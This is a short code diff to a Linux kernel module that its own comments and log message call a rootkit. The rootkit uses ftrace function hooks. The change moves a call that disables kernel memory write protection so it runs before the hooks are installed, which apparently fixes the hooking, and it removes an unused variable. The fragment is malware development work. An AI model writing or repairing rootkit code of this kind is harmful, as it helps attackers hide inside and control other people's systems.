@@ -493,6 +493,7 @@ static struct ftrace_hook hooks[] = {
 */
 static int __init init_func(void){
     int err;
+    unprotect_memory();
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 
     if(err){
@@ -512,8 +513,6 @@ static int __init init_func(void){
     //     printk(KERN_INFO "error:store error\n");
     // }
 
-    unprotect_memory();
-
     // if(hook() == err){
     //     printk(KERN_INFO "error: hook error\n");
     // }
@@ -527,7 +526,6 @@ static int __init init_func(void){
  * exit of the rootkit
 */
 static void __exit exit_func(void){
-    int err = 1;
     printk(KERN_INFO "rootkit: stoped\n");
 
     unprotect_memory();
